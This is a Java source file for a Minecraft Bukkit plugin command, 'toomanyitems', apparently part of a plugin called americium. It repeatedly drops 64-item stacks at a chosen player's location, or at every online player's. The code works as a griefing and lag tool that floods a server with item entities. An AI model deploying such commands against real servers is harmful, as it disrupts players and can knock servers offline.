package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.ItemStack;

import java.util.HashMap;
import java.util.UUID;

public class TooManyItems implements Command, Listener {
    private final HashMap<UUID, Material> toggled = new HashMap<>();
    private boolean allToggled = false;
    private Material allMaterial = null;

    @Override
    public String[] getCommands() {
        return new String[]{"toomanyitems"};
    }

    @Override
    public String getDescription() {
        return "Drop an item at a player's inventory until you stop.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "toomanyitems <player | *> (material)");
            return;
        }

        Material material = Material.DIRT;
        if (args.length > 1) {
            try {
                material = Material.valueOf(args[1].toUpperCase());
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }
        }

        if (args[0].equals("*")) {
            this.allToggled = !this.allToggled;
            allMaterial = material;

            if (this.allToggled) {
                sender.sendMessage(Colors.Prefix + Colors.Success + "Now all players have too many items!");
            } else {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "Now all players don't have too many items.");
            }
            return;
        }

        Player found = Bukkit.getPlayer(args[0]);
        if (found == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        UUID uuid = found.getUniqueId();
        if (toggled.containsKey(uuid)) {
            toggled.remove(uuid);
            sender.sendMessage(Colors.Prefix + Colors.Failure + found.getName() + " is now not using too many items!");
            return;
        }

        toggled.put(uuid, material);
        sender.sendMessage(Colors.Prefix + Colors.Success + found.getName() + " now has too many items!");
    }

    @Override
    public void onEnable(Z_ z) {
        Bukkit.getScheduler().scheduleSyncRepeatingTask(z, () -> {
            if (this.toggled.size() == 0 && !this.allToggled) {
                return;
            }

            for (Player p : Bukkit.getOnlinePlayers()) {
                if(this.allToggled) {
                    p.getWorld().dropItem(p.getLocation(), new ItemStack(this.allMaterial, 64));
                    continue;
                }

                if (!toggled.containsKey(p.getUniqueId())) {
                    continue;
                }

                Material item = toggled.get(p.getUniqueId());
                p.getWorld().dropItem(p.getLocation(), new ItemStack(item, 64));
            }
        }, 0, 2);
    }
}
